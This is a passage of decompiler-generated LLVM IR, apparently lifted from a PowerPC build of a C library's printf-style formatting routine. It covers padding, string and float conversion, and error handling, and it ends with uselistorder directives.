  %v3_1000be5c = icmp eq i32 %v1_1000be5c, 0
  br i1 %v3_1000be5c, label %dec_label_pc_1000bea8, label %dec_label_pc_1000be64

dec_label_pc_1000be64:                            ; preds = %dec_label_pc_1000be58
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_1000be68, label %dec_label_pc_1000be74, label %dec_label_pc_1000be84.thread

dec_label_pc_1000be84.thread:                     ; preds = %dec_label_pc_1000be64
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_1000bea8

dec_label_pc_1000be74:                            ; preds = %dec_label_pc_1000be64
  br i1 %v3_1000be74, label %dec_label_pc_1000be7c, label %dec_label_pc_1000be84

dec_label_pc_1000be7c:                            ; preds = %dec_label_pc_1000be74
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_1000bea8

dec_label_pc_1000be84:                            ; preds = %dec_label_pc_1000be74
  br i1 %v3_1000be84, label %dec_label_pc_1000be8c, label %dec_label_pc_1000bea8

dec_label_pc_1000be8c:                            ; preds = %dec_label_pc_1000be84
  %v3_1000be8c = icmp ugt i32 %v0_1000be8c, %v1_1000be4c
  br i1 %v3_1000be8c, label %dec_label_pc_1000bea8, label %dec_label_pc_1000be94

dec_label_pc_1000be94:                            ; preds = %dec_label_pc_1000be8c
  %v1_1000be94 = inttoptr i32 %v0_1000bea8 to i8*
  %v2_1000be94 = load i8, i8* %v1_1000be94, align 1
  %v3_1000be94 = zext i8 %v2_1000be94 to i32
  store i32 %v3_1000be94, i32* %r0.global-to-local, align 4
  %v3_1000be9c = icmp eq i8 %v2_1000be94, 48
  br i1 %v3_1000be9c, label %dec_label_pc_1000bea8, label %dec_label_pc_1000bea4

dec_label_pc_1000bea4:                            ; preds = %dec_label_pc_1000be94
  %v1_1000bea4 = add i32 %v2_1000be44, 128
  br label %dec_label_pc_1000bea8

dec_label_pc_1000bea8:                            ; preds = %dec_label_pc_1000be84.thread, %dec_label_pc_1000be84, %dec_label_pc_1000be94, %dec_label_pc_1000be8c, %dec_label_pc_1000be58, %dec_label_pc_1000be7c, %dec_label_pc_1000bea4
  %v1_1000bef0 = phi i32 [ %v0_1000be8c, %dec_label_pc_1000be84 ], [ 1, %dec_label_pc_1000be94 ], [ %v0_1000be8c, %dec_label_pc_1000be8c ], [ %v0_1000be8c, %dec_label_pc_1000be58 ], [ %v0_1000be8c, %dec_label_pc_1000be7c ], [ %v1_1000bea4, %dec_label_pc_1000bea4 ], [ %v0_1000be8c, %dec_label_pc_1000be84.thread ]
  %v1_1000bea8 = inttoptr i32 %v0_1000bea8 to i8*
  %v2_1000bea8 = load i8, i8* %v1_1000bea8, align 1
  %v3_1000bea8 = zext i8 %v2_1000bea8 to i32
  store i32 %v3_1000bea8, i32* %r0.global-to-local, align 4
  %v3_1000beac = icmp eq i8 %v2_1000bea8, 48
  br i1 %v3_1000beac, label %dec_label_pc_1000beb4, label %dec_label_pc_1000beec

dec_label_pc_1000beb4:                            ; preds = %dec_label_pc_1000bea8
  %v0_1000beb4 = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_1000beb4, 6
  br i1 %tmp77, label %dec_label_pc_1000bec0, label %dec_label_pc_1000bebc

dec_label_pc_1000bebc:                            ; preds = %dec_label_pc_1000beb4
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_1000bec0

dec_label_pc_1000bec0:                            ; preds = %dec_label_pc_1000beb4, %dec_label_pc_1000bebc
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_1000bec4, label %dec_label_pc_1000becc, label %dec_label_pc_1000bedc

dec_label_pc_1000becc:                            ; preds = %dec_label_pc_1000bec0
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1001c880.843 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000c068

dec_label_pc_1000bedc:                            ; preds = %dec_label_pc_1000bec0
  %v3_1000bedc = icmp eq i32 %v1_1000bef0, 0
  br i1 %v3_1000bedc, label %dec_label_pc_1000bee4, label %dec_label_pc_1000beec

dec_label_pc_1000bee4:                            ; preds = %dec_label_pc_1000bedc
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c068

dec_label_pc_1000beec:                            ; preds = %dec_label_pc_1000bedc, %dec_label_pc_1000bea8
  %v3_1000beec = icmp ugt i32 %v1_1000bef0, %v1_1000be4c
  %v2_1000bef0 = sub i32 %v1_1000bef0, %v1_1000be4c
  store i32 %v2_1000bef0, i32* %r29.global-to-local, align 4
  br i1 %v3_1000beec, label %dec_label_pc_1000c088thread-pre-split, label %dec_label_pc_1000c068

dec_label_pc_1000befc:                            ; preds = %dec_label_pc_1000bd1c
  br i1 %v2_1000befc, label %dec_label_pc_1000bf30, label %dec_label_pc_1000bf04

dec_label_pc_1000bf04:                            ; preds = %dec_label_pc_1000befc
  %v3_1000bf04 = load i32, i32* %stack_var_-344, align 4
  %v0_1000bf10 = load i32, i32* %r24.global-to-local, align 4
  store i32 268484384, i32* @lr, align 4
  %v5_1000bf1c = call i32 @_fpmaxtostr(i32 %v0_1000bf10, i32* nonnull %stack_var_-196, i32 add (i32 ptrtoint (i32* @global_var_10010000.9 to i32), i32 -17672), i32 %v3_1000bf04)
  %v1_1000bf20 = icmp slt i32 %v5_1000bf1c, 0
  br i1 %v1_1000bf20, label %dec_label_pc_1000c1ec, label %dec_label_pc_1000bf28

dec_label_pc_1000bf28:                            ; preds = %dec_label_pc_1000bf04
  %v0_1000bf28 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000bf28 = add i32 %v0_1000bf28, %v5_1000bf1c
  store i32 %v2_1000bf28, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000c1d8

dec_label_pc_1000bf30:                            ; preds = %dec_label_pc_1000befc
  br i1 %v2_1000bf30, label %dec_label_pc_1000bfd8, label %dec_label_pc_1000bf38

dec_label_pc_1000bf38:                            ; preds = %dec_label_pc_1000bf30
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_1000bf44 = load i32, i32* %stack_var_-344, align 4
  %v1_1000bf4c = inttoptr i32 %v3_1000bf44 to i32*
  %v2_1000bf4c = load i32, i32* %v1_1000bf4c, align 4
  br i1 %v3_1000bf30, label %dec_label_pc_1000bf4c, label %dec_label_pc_1000bfa0

dec_label_pc_1000bf4c:                            ; preds = %dec_label_pc_1000bf38
  store i32 %v2_1000bf4c, i32* %r0.global-to-local, align 4
  %v3_1000bf50 = icmp eq i32 %v2_1000bf4c, 0
  store i32 %v2_1000bf4c, i32* %stack_var_-340, align 4
  br i1 %v3_1000bf50, label %dec_label_pc_1000c070, label %dec_label_pc_1000bf5c

dec_label_pc_1000bf5c:                            ; preds = %dec_label_pc_1000bf4c
  %v3_1000bf5c = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000bf5c, i32* %r0.global-to-local, align 4
  %v1_1000bf64 = icmp slt i32 %v3_1000bf5c, 0
  br i1 %v1_1000bf64, label %dec_label_pc_1000bf70, label %dec_label_pc_1000bf6c

dec_label_pc_1000bf6c:                            ; preds = %dec_label_pc_1000bf5c
  br label %dec_label_pc_1000bf70

dec_label_pc_1000bf70:                            ; preds = %dec_label_pc_1000bf5c, %dec_label_pc_1000bf6c
  %storemerge94 = phi i32 [ %v3_1000bf5c, %dec_label_pc_1000bf6c ], [ -1, %dec_label_pc_1000bf5c ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_1000bf70, i32* @r3, align 4
  store i32 %v2_1000bf74, i32* @r6, align 4
  store i32 %v2_1000bf70, i32* @r4, align 4
  store i32 268484480, i32* @lr, align 4
  %v0_1000bf7c = call i32 @__GI_wcsrtombs()
  %v3_1000bf80 = icmp eq i32 %v0_1000bf7c, -1
  store i32 %v0_1000bf7c, i32* @r31, align 4
  br i1 %v3_1000bf80, label %dec_label_pc_1000c1ec, label %dec_label_pc_1000bf8c

dec_label_pc_1000bf8c:                            ; preds = %dec_label_pc_1000bf70
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000c088

dec_label_pc_1000bfa0:                            ; preds = %dec_label_pc_1000bf38
  store i32 %v2_1000c050, i32* @r28, align 4
  store i32 268484532, i32* @lr, align 4
  %v3_1000bfb0 = call i32 @__GI_wcrtomb(i32 %v2_1000c050, i32 %v2_1000bf4c, i32 %v2_1000bf74)
  %v3_1000bfb4 = icmp eq i32 %v3_1000bfb0, -1
  store i32 %v3_1000bfb0, i32* @r31, align 4
  br i1 %v3_1000bfb4, label %dec_label_pc_1000c1ec, label %dec_label_pc_1000bfc0

dec_label_pc_1000bfc0:                            ; preds = %dec_label_pc_1000bfa0
  store i32 %v2_1000c050, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_1000bfd0 = load i32, i32* @r25, align 4
  %v1_1000bfd0 = load i32, i32* @r28, align 4
  %v3_1000bfd0 = trunc i32 %v0_1000bfd0 to i8
  %v4_1000bfd0 = add i32 %v1_1000bfd0, %v3_1000bfb0
  %v5_1000bfd0 = inttoptr i32 %v4_1000bfd0 to i8*
  store i8 %v3_1000bfd0, i8* %v5_1000bfd0, align 1
  %v0_1000c08c.pre.pre = load i32, i32* @r31, align 4
  %v1_1000c08c.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c088thread-pre-split

dec_label_pc_1000bfd8:                            ; preds = %dec_label_pc_1000bf30
  br i1 %v2_1000bfd8, label %dec_label_pc_1000c044, label %dec_label_pc_1000bfe0

dec_label_pc_1000bfe0:                            ; preds = %dec_label_pc_1000bfd8
  %v3_1000bfe4 = load i32, i32* %stack_var_-344, align 4
  %v1_1000bfec = inttoptr i32 %v3_1000bfe4 to i32*
  %v2_1000bfec = load i32, i32* %v1_1000bfec, align 4
  br i1 %v3_1000bfd8, label %dec_label_pc_1000bfec, label %dec_label_pc_1000c01c

dec_label_pc_1000bfec:                            ; preds = %dec_label_pc_1000bfe0
  store i32 %v2_1000bfec, i32* %r30.global-to-local, align 4
  %v3_1000bff0 = icmp eq i32 %v2_1000bfec, 0
  br i1 %v3_1000bff0, label %dec_label_pc_1000c070, label %dec_label_pc_1000bff8

dec_label_pc_1000bff8:                            ; preds = %dec_label_pc_1000bfec, %dec_label_pc_1000c04c
  %v0_1000c00c = phi i32 [ %v2_1000bfec, %dec_label_pc_1000bfec ], [ %v3_1000c05c, %dec_label_pc_1000c04c ]
  %v3_1000bff8 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000bff8, i32* %r0.global-to-local, align 4
  %v1_1000c000 = icmp slt i32 %v3_1000bff8, 0
  br i1 %v1_1000c000, label %dec_label_pc_1000c00c, label %dec_label_pc_1000c008

dec_label_pc_1000c008:                            ; preds = %dec_label_pc_1000bff8
  br label %dec_label_pc_1000c00c

dec_label_pc_1000c00c:                            ; preds = %dec_label_pc_1000bff8, %dec_label_pc_1000c008
  %storemerge95 = phi i32 [ %v3_1000bff8, %dec_label_pc_1000c008 ], [ -1, %dec_label_pc_1000bff8 ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268484628, i32* @lr, align 4
  %v1_1000c010 = inttoptr i32 %v0_1000c00c to i8*
  %v2_1000c010 = call i32 @strnlen(i8* %v1_1000c010)
  store i32 %v2_1000c010, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c07c

dec_label_pc_1000c01c:                            ; preds = %dec_label_pc_1000bfe0
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_1000bfec, i32* %stack_var_-328, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_1000c050, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000c088thread-pre-split

dec_label_pc_1000c044:                            ; preds = %dec_label_pc_1000bfd8
  br i1 %v3_1000c044, label %dec_label_pc_1000c04c, label %dec_label_pc_1000c1ec

dec_label_pc_1000c04c:                            ; preds = %dec_label_pc_1000c044
  %v0_1000c04c = call i32 @__errno_location()
  %v1_1000c054 = inttoptr i32 %v0_1000c04c to i32*
  %v2_1000c054 = load i32, i32* %v1_1000c054, align 4
  store i32 %v2_1000c054, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268484704, i32* @lr, align 4
  %v3_1000c05c = call i32 @__GI___glibc_strerror_r(i32 %v2_1000c054, i32 %v2_1000c050, i32 128)
  store i32 %v3_1000c05c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000bff8

dec_label_pc_1000c068:                            ; preds = %dec_label_pc_1000beec, %dec_label_pc_1000bee4, %dec_label_pc_1000becc
  %v0_1000c08c.pre41 = phi i32 [ %v1_1000be4c, %dec_label_pc_1000beec ], [ 0, %dec_label_pc_1000bee4 ], [ 5, %dec_label_pc_1000becc ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c088thread-pre-split

dec_label_pc_1000c070:                            ; preds = %dec_label_pc_1000bfec, %dec_label_pc_1000bf4c
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001c888.844 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000c07c

dec_label_pc_1000c07c:                            ; preds = %dec_label_pc_1000c00c, %dec_label_pc_1000c070
  %v0_1000c08c29 = phi i32 [ %v2_1000c010, %dec_label_pc_1000c00c ], [ 6, %dec_label_pc_1000c070 ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_1000c088

dec_label_pc_1000c088thread-pre-split:            ; preds = %dec_label_pc_1000bfc0, %dec_label_pc_1000c01c, %dec_label_pc_1000c068, %dec_label_pc_1000beec
  %v1_1000c08c.pre = phi i32 [ %v2_1000bef0, %dec_label_pc_1000beec ], [ 0, %dec_label_pc_1000c068 ], [ %v1_1000c08c.pre.pre, %dec_label_pc_1000bfc0 ], [ 0, %dec_label_pc_1000c01c ]
  %v0_1000c08c.pre = phi i32 [ %v1_1000be4c, %dec_label_pc_1000beec ], [ %v0_1000c08c.pre41, %dec_label_pc_1000c068 ], [ %v0_1000c08c.pre.pre, %dec_label_pc_1000bfc0 ], [ 1, %dec_label_pc_1000c01c ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_1000beec ], [ %stack_var_-184.0, %dec_label_pc_1000c068 ], [ %v0_1000be30, %dec_label_pc_1000bfc0 ], [ %v0_1000be30, %dec_label_pc_1000c01c ]
  %v0_1000c088.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000c088

dec_label_pc_1000c088:                            ; preds = %dec_label_pc_1000c088thread-pre-split, %dec_label_pc_1000bf8c, %dec_label_pc_1000c07c
  %v1_1000c08c = phi i32 [ %v1_1000c08c.pre, %dec_label_pc_1000c088thread-pre-split ], [ 0, %dec_label_pc_1000bf8c ], [ 0, %dec_label_pc_1000c07c ]
  %v0_1000c08c = phi i32 [ %v0_1000c08c.pre, %dec_label_pc_1000c088thread-pre-split ], [ %v0_1000bf7c, %dec_label_pc_1000bf8c ], [ %v0_1000c08c29, %dec_label_pc_1000c07c ]
  %v0_1000c094 = phi i32 [ %v0_1000c088.pr, %dec_label_pc_1000c088thread-pre-split ], [ 11, %dec_label_pc_1000bf8c ], [ 11, %dec_label_pc_1000c07c ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_1000c088thread-pre-split ], [ %v0_1000be30, %dec_label_pc_1000bf8c ], [ %v0_1000be30, %dec_label_pc_1000c07c ]
  %v3_1000c088 = icmp eq i32 %v0_1000c094, 11
  %v2_1000c08c = add i32 %v0_1000c08c, %v1_1000c08c
  store i32 %v2_1000c08c, i32* %r0.global-to-local, align 4
  br i1 %v3_1000c088, label %dec_label_pc_1000c0a8, label %dec_label_pc_1000c094

dec_label_pc_1000c094:                            ; preds = %dec_label_pc_1000c088
  %v0_1000c098 = call i32 @__asm_mfcr()
  %v1_1000c09c = call i32 @__asm_rlwinm(i32 %v0_1000c098, i32 30, i32 31, i32 31)
  %v1_1000c0a0 = add i32 %v1_1000c09c, 1
  %v0_1000c0a4 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000c0a4 = add i32 %v0_1000c0a4, %v1_1000c0a0
  store i32 %v2_1000c0a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000c0a8

dec_label_pc_1000c0a8:                            ; preds = %dec_label_pc_1000c088, %dec_label_pc_1000c094
  %v0_1000c0c0 = phi i32 [ %v2_1000c08c, %dec_label_pc_1000c088 ], [ %v2_1000c0a4, %dec_label_pc_1000c094 ]
  %v3_1000c0b0 = icmp ugt i32 %tmp, %v0_1000c0c0
  br i1 %v3_1000c0b0, label %dec_label_pc_1000c0b8, label %dec_label_pc_1000c0bc

dec_label_pc_1000c0b8:                            ; preds = %dec_label_pc_1000c0a8
  %v2_1000c0b8 = sub i32 %tmp, %v0_1000c0c0
  br label %dec_label_pc_1000c0bc

dec_label_pc_1000c0bc:                            ; preds = %dec_label_pc_1000c0a8, %dec_label_pc_1000c0b8
  %storemerge93 = phi i32 [ %v2_1000c0b8, %dec_label_pc_1000c0b8 ], [ 0, %dec_label_pc_1000c0a8 ]
  %v1_1000c0cc = phi i32 [ %v2_1000c0b8, %dec_label_pc_1000c0b8 ], [ 0, %dec_label_pc_1000c0a8 ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_1000c0bc = load i32, i32* @r26, align 4
  %v3_1000c0bc = icmp eq i32 %v0_1000c0bc, 48
  %v2_1000c0c0 = add i32 %v1_1000c0cc, %v0_1000c0c0
  store i32 %v2_1000c0c0, i32* %r0.global-to-local, align 4
  %v0_1000c0c4 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000c0c4 = add i32 %v0_1000c0c4, %v2_1000c0c0
  store i32 %v2_1000c0c4, i32* %r23.global-to-local, align 4
  br i1 %v3_1000c0bc, label %dec_label_pc_1000c0cc, label %dec_label_pc_1000c0d4

dec_label_pc_1000c0cc:                            ; preds = %dec_label_pc_1000c0bc
  %v0_1000c0cc = load i32, i32* %r29.global-to-local, align 4
  %v2_1000c0cc = add i32 %v0_1000c0cc, %v1_1000c0cc
  store i32 %v2_1000c0cc, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000c0d4

dec_label_pc_1000c0d4:                            ; preds = %dec_label_pc_1000c0bc, %dec_label_pc_1000c0cc
  %v0_1000c0e8 = phi i32 [ %v1_1000c0cc, %dec_label_pc_1000c0bc ], [ 0, %dec_label_pc_1000c0cc ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_1000c0d8 = and i32 %stack_var_-184.1, 8
  %v3_1000c0d8 = icmp eq i32 %v1_1000c0d8, 0
  br i1 %v3_1000c0d8, label %dec_label_pc_1000c0e0, label %dec_label_pc_1000c0fc

dec_label_pc_1000c0e0:                            ; preds = %dec_label_pc_1000c0d4
  %v0_1000c0e0 = load i32, i32* %r24.global-to-local, align 4
  store i32 268484848, i32* @lr, align 4
  %v4_1000c0ec = call i32 @_charpad(i32 %v0_1000c0e0, i8 32, i32 %v0_1000c0e8)
  %v1_1000c0f0 = load i32, i32* @r28, align 4
  %v4_1000c0f0 = icmp eq i32 %v4_1000c0ec, %v1_1000c0f0
  br i1 %v4_1000c0f0, label %dec_label_pc_1000c0f8, label %dec_label_pc_1000c1ec

dec_label_pc_1000c0f8:                            ; preds = %dec_label_pc_1000c0e0
  br label %dec_label_pc_1000c0fc

dec_label_pc_1000c0fc:                            ; preds = %dec_label_pc_1000c0d4, %dec_label_pc_1000c0f8
  %v0_1000c100 = load i32, i32* %r24.global-to-local, align 4
  %v0_1000c108 = load i32, i32* @r27, align 4
  %v2_1000c108 = add i32 %v0_1000c108, ptrtoint (i32* @global_var_1001c890.845 to i32)
  store i32 268484880, i32* @lr, align 4
  %v2_1000c10c = call i32 @__GI_fputs_unlocked(i32 %v2_1000c108, i32 %v0_1000c100)
  %v0_1000c118 = load i32, i32* @r29, align 4
  store i32 268484896, i32* @lr, align 4
  %v4_1000c11c = call i32 @_charpad(i32 %v0_1000c100, i8 48, i32 %v0_1000c118)
  %v1_1000c120 = load i32, i32* @r29, align 4
  %v4_1000c120 = icmp eq i32 %v4_1000c11c, %v1_1000c120
  br i1 %v4_1000c120, label %dec_label_pc_1000c128, label %dec_label_pc_1000c1ec

dec_label_pc_1000c128:                            ; preds = %dec_label_pc_1000c0fc
  %v3_1000c128 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_1000c128, i32* %r0.global-to-local, align 4
  %v3_1000c12c = icmp eq i32 %v3_1000c128, 0
  br i1 %v3_1000c12c, label %dec_label_pc_1000c134, label %dec_label_pc_1000c15c

dec_label_pc_1000c134:                            ; preds = %dec_label_pc_1000c128
  %v0_1000c134 = load i32, i32* @r31, align 4
  %v3_1000c134 = icmp eq i32 %v0_1000c134, 0
  br i1 %v3_1000c134, label %dec_label_pc_1000c150.thread, label %dec_label_pc_1000c150

dec_label_pc_1000c150.thread:                     ; preds = %dec_label_pc_1000c134
  br label %dec_label_pc_1000c1c0

dec_label_pc_1000c150:                            ; preds = %dec_label_pc_1000c134
  %v0_1000c140 = load i32, i32* @r30, align 4
  %v0_1000c148 = load i32, i32* %r24.global-to-local, align 4
  store i32 268484944, i32* @lr, align 4
  %v4_1000c14c = inttoptr i32 %v0_1000c148 to i16*
  %v5_1000c14c = call i32 @__stdio_fwrite(i32 %v0_1000c140, i32 %v0_1000c134, i16* %v4_1000c14c)
  %v1_1000c150.pre = load i32, i32* @r31, align 4
  %v4_1000c150 = icmp eq i32 %v5_1000c14c, %v1_1000c150.pre
  br i1 %v4_1000c150, label %dec_label_pc_1000c1c0, label %dec_label_pc_1000c1ec

dec_label_pc_1000c15c:                            ; preds = %dec_label_pc_1000c128
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_1000c1a0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000c1a0

dec_label_pc_1000c168:                            ; preds = %dec_label_pc_1000c1a0
  %tmp78 = icmp ult i32 %v0_1000c1b8, 129
  br i1 %tmp78, label %dec_label_pc_1000c170, label %dec_label_pc_1000c16c

dec_label_pc_1000c16c:                            ; preds = %dec_label_pc_1000c168
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_1000c170

dec_label_pc_1000c170:                            ; preds = %dec_label_pc_1000c168, %dec_label_pc_1000c16c
  store i32 ptrtoint (i32* @global_var_1000c174.846 to i32), i32* @lr, align 4
  %v0_1000c170 = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000c170, i32* @r30, align 4
  %v3_1000c178 = icmp eq i32 %v0_1000c170, 0
  br i1 %v3_1000c178, label %dec_label_pc_1000c194, label %dec_label_pc_1000c18c

dec_label_pc_1000c18c:                            ; preds = %dec_label_pc_1000c170
  %v0_1000c17c = load i32, i32* %r24.global-to-local, align 4
  store i32 268485008, i32* @lr, align 4
  %v3_1000c18c = inttoptr i32 %v0_1000c17c to i16*
  %v4_1000c18c = call i32 @__stdio_fwrite(i32 %v2_1000c050, i32 %v0_1000c170, i16* %v3_1000c18c)
  store i32 %v4_1000c18c, i32* %r0.global-to-local, align 4
  %v1_1000c194.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c194

dec_label_pc_1000c194:                            ; preds = %dec_label_pc_1000c170, %dec_label_pc_1000c18c
  %v1_1000c194 = phi i32 [ 0, %dec_label_pc_1000c170 ], [ %v1_1000c194.pre, %dec_label_pc_1000c18c ]
  %v0_1000c198 = phi i32 [ 0, %dec_label_pc_1000c170 ], [ %v4_1000c18c, %dec_label_pc_1000c18c ]
  %v4_1000c194 = icmp eq i32 %v0_1000c198, %v1_1000c194
  %v1_1000c198 = load i32, i32* @r31, align 4
  %v2_1000c198 = sub i32 %v1_1000c198, %v0_1000c198
  store i32 %v2_1000c198, i32* @r31, align 4
  br i1 %v4_1000c194, label %dec_label_pc_1000c1a0, label %dec_label_pc_1000c1ec

dec_label_pc_1000c1a0:                            ; preds = %dec_label_pc_1000c194, %dec_label_pc_1000c15c
  %v0_1000c1b8 = phi i32 [ %v2_1000c198, %dec_label_pc_1000c194 ], [ %v0_1000c1a0.pre, %dec_label_pc_1000c15c ]
  %v3_1000c1a0 = icmp eq i32 %v0_1000c1b8, 0
  store i32 %v2_1000c050, i32* @r29, align 4
  store i32 %v2_1000bf70, i32* @r4, align 4
  store i32 %v2_1000bf74, i32* @r6, align 4
  store i32 %v2_1000c050, i32* @r3, align 4
  store i32 %v0_1000c1b8, i32* @r5, align 4
  br i1 %v3_1000c1a0, label %dec_label_pc_1000c1c0, label %dec_label_pc_1000c168

dec_label_pc_1000c1c0:                            ; preds = %dec_label_pc_1000c1a0, %dec_label_pc_1000c150.thread, %dec_label_pc_1000c150
  %v0_1000c1c0 = load i32, i32* %r24.global-to-local, align 4
  %v0_1000c1c8 = load i32, i32* @r28, align 4
  store i32 268485072, i32* @lr, align 4
  %v4_1000c1cc = call i32 @_charpad(i32 %v0_1000c1c0, i8 32, i32 %v0_1000c1c8)
  %v1_1000c1d0 = load i32, i32* @r28, align 4
  %v4_1000c1d0 = icmp eq i32 %v4_1000c1cc, %v1_1000c1d0
  br i1 %v4_1000c1d0, label %dec_label_pc_1000c1d8, label %dec_label_pc_1000c1ec

dec_label_pc_1000c1d8:                            ; preds = %dec_label_pc_1000c1c0, %dec_label_pc_1000bf28, %dec_label_pc_1000bcfc
  %stack_var_-184.2 = phi i32 [ %v0_1000be30, %dec_label_pc_1000bcfc ], [ %stack_var_-184.1, %dec_label_pc_1000c1c0 ], [ %v0_1000be30, %dec_label_pc_1000bf28 ]
  %v3_1000c1d8 = load i8*, i8** %stack_var_-200, align 4
  %v4_1000c1d8 = ptrtoint i8* %v3_1000c1d8 to i32
  store i32 %v4_1000c1d8, i32* @r29, align 4
  br label %dec_label_pc_1000c1dc

dec_label_pc_1000c1dc:                            ; preds = %dec_label_pc_1000bbf0, %dec_label_pc_1000c1d8
  %v0_1000c1dc = phi i32 [ %v0_1000c1dc.pre, %dec_label_pc_1000bbf0 ], [ %v4_1000c1d8, %dec_label_pc_1000c1d8 ]
  %v0_1000be30 = phi i32 [ %tmp56, %dec_label_pc_1000bbf0 ], [ %stack_var_-184.2, %dec_label_pc_1000c1d8 ]
  br label %dec_label_pc_1000bc08

dec_label_pc_1000c1ec:                            ; preds = %dec_label_pc_1000c044, %dec_label_pc_1000c1c0, %dec_label_pc_1000c150, %dec_label_pc_1000c0fc, %dec_label_pc_1000c0e0, %dec_label_pc_1000bfa0, %dec_label_pc_1000bf70, %dec_label_pc_1000bf04, %dec_label_pc_1000bc44, %dec_label_pc_1000c194
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000c1f0

dec_label_pc_1000c1f0:                            ; preds = %dec_label_pc_1000bc50, %dec_label_pc_1000bbc8, %dec_label_pc_1000bbe0, %dec_label_pc_1000c1ec
  store i32 %v0_1000bb9c, i32* %r0.global-to-local, align 4
  %v0_1000c1f4 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_1000c1f4

; uselistorder directives
  uselistorder i32 %v0_1000be30, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_1000c1b8, { 1, 2, 0 }
  uselistorder i32 %v1_1000c0cc, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_1000c05c, { 1, 0 }
  uselistorder i32 %v2_1000bfec, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000bf4c, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000be30, { 1, 0 }
  uselistorder i32 %v6_1000bde8, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v1_1000bdb8, { 1, 0 }
  uselistorder i32 %v1_1000bd5c, { 1, 0 }
  uselistorder i1 %v2_1000bd50, { 1, 0 }
  uselistorder i32 %v0_1000bd00, { 1, 0, 2 }
  uselistorder i32 %v1_1000bcec, { 1, 0 }
  uselistorder i32 %v0_1000bce4, { 1, 0 }
  uselistorder i32 %v1_1000bce0, { 1, 0 }
  uselistorder i32 %v1_1000bc5c, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000bc24, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000bc34, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_1000c050, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_1000bc98, { 1, 2, 0 }
  uselistorder i32 %v4_1000bc90, { 1, 0 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
